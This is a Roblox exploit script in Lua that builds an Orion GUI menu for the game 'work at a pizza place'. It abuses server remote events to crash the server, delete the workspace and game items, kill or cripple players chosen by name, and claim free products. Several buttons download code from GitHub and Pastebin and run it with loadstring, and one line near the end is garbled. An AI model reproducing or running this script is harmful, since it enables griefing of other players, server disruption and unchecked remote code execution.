local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()


online = false

local Banned = {}
local Slock = false
local destroy = workspace.GameService.CloseBox
local Players = game:GetService('Players')
local LPlayer = Players.LocalPlayer

local SelectionBox = Instance.new("SelectionBox",game.Workspace)
SelectionBox.Name = "th"
SelectionBox.LineThickness = 0.05
SelectionBox.Adornee = nil
SelectionBox.Color3 = Color3.fromRGB(255,0,0)
SelectionBox.Visible = false

local IsEquipped = false
local Mouse = game.Players.LocalPlayer:GetMouse()


function DestroyObj(Obj)
	game:GetService("ReplicatedStorage").Channels.HouseChannel:FireServer("PlaceFurniture",Obj or nil,CFrame.new(0,-math.huge,0),0)
end


local Window = OrionLib:MakeWindow({Name = "work at a pizza place old" ,IntroText = "Cutsences X", IntroEnabled = true,HidePremium = false, SaveConfig = true, ConfigFolder = "config"})


local Tab = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})




local Section = Tab:AddSection({
	Name = "ServerSide"
})

Tab:AddButton({
	Name = "crash server",
	Callback = function()
		online = true
		for i,v in pairs(game:GetDescendants()) do
			if v.Parent.Name ~= 'Players' then
			pcall(function()
			destroy:FireServer(v,"call")
			end)
			end
			end
  	end    
})

Tab:AddButton({
	Name = "Ruin",
	Callback = function()
		online = true
		for i,v in pairs(game:GetDescendants()) do
			if v.Parent.Name ~= 'Players' then
			pcall(function()
			destroy:FireServer(v,"call")
			end)
			end
			end
		end
})


Tab:AddButton({
	Name = "Delete pizzas and dough",
	Callback = function()
		
		for i,v in pairs(workspace:GetDescendants()) do
		if v.Name == 'Dough' or v.Parent.Name == 'Ingredients' then
		destroy:FireServer(v,"call")
		end
		end
  	end    
})

Tab:AddTextbox({
	Name = "Cripple player",
	Default = "player name",
	TextDisappear = true,
	Callback = function(Value)
		
			destroy:FireServer(Players:FindFirstChild(Value).Character.HumanoidRootPart,"call")
			
	end	  
})

Tab:AddTextbox({
	Name = "Kill Player",
	Default = "player name",
	TextDisappear = true,
	Callback = function(Value)
	
		
		destroy:FireServer(Players:FindFirstChild(Value).Character.Head,"call")
		

	
			
	end	  
})

Tab:AddTextbox({
	Name = "Disable",
	Default = "player name",
	TextDisappear = true,
	Callback = function(Value)
		
		destroy:FireServer(Players:FindFirstChild(Value).Character.Humanoid,"call")
			
	end	  
})

Tab:AddButton({
	Name = "Destroy Workspace (instant)",
	Callback = function()
		
		for i,v in pairs(workspace:GetDescendants()) do
			pcall(function()

			
			DestroyObj(v)
		
	end)
	end
end
})


Tab:AddButton({
	Name = "Other Destroy Workspace (usually crashs)",
	Callback = function()
		
		for i,v in pairs(workspace:GetDescendants()) do
			pcall(function()

			if v.Name ~= 'GameService' or v.Parent.Name ~= 'GameService' then
			destroy:FireServer(v,"call")
		end
	end)
	end
end
})





Tab:AddButton({
	Name = "2nd delete tool",
	Callback = function()
		for i,v in pairs(workspace:GetDescendants()) do
			pcall(function()
			v.Locked = false
			end)
			end
			local function OnClick()
			pcall(function()
			
				local target = Mouse.Target
			destroy:FireServer(target,"call")
			print('Destroyed ' .. target.Name)
			end)
			end
			local b = Instance.new('Tool', game.Players.LocalPlayer.Backpack)
			b.RequiresHandle = false
			b.Activated:connect(OnClick)
  	end    
})






Tab:AddToggle({
	Name = "Click Delete",
	Default = false,
	Callback = function(Value)
		if Value == false then
            SelectionBox.Visible = true
		SelectionBox.Adornee = nil
		IsEquipped = false
       else
        SelectionBox.Visible = true
		SelectionBox.Adornee = nil
		IsEquipped = true
        
    end
	end    
})

Tab:AddButton({
	Name = "Play all sounds at once",
	Callback = function()
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Play()
			end
		 end
  	end    
})
	
Tab:AddButton({
	Name = "Loop Fling (made by: digitality)",
	Callback = function()
		
		loadstring(game:HttpGet('https://github.com/DigitalityScripts/roblox-scripts/raw/main/loop%20fling%20all'))()

  	end    
})


 
Tab:AddButton({
	Name = "bring unanchored gui",
	Callback = function()
		loadstring(game:HttpGetAsync("https://pastebin.com/raw/sLUZamZN"))()
  	end    
})


Tab:AddButton({
	Name = "free moneyz",
	Callback = function()
		
local ohNumber1 = 23491618

workspace.Main.FreeProducts:FireServer(ohNumber1)
  	end    
})
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
Mouse.Button1Down:Connect(function()
	if IsEquipped then
			DestroyObj(Mouse.Target)
	end
	end)

		
	




function GetPlrByPart(Prt)
	if Prt then
		for _,Plr in pairs(game.Players:GetPlayers()) do
			if Plr.Character then
				if Prt:IsDescendantOf(Plr.Character) then
					return Plr
				end
			end
		end
	end
	return nil

end

while true do
    wait()
if IsEquipped == true then
    SelectionBox.Visible = true
else
    SelectionBox.Visible = false
end
end
while true do
	if GetPlrByPart(Mouse.Target or nil) then
	
	end
	SelectionBox.Adornee = Mouse.Target or nil

	wait(0.1)
	endt(0.1)
end
--[[
Name = <string> - The name of the toggle.
Default = <bool> - The default value of the toggle.
Callback = <function> - The function of the toggle.
]]
OrionLib:Init()
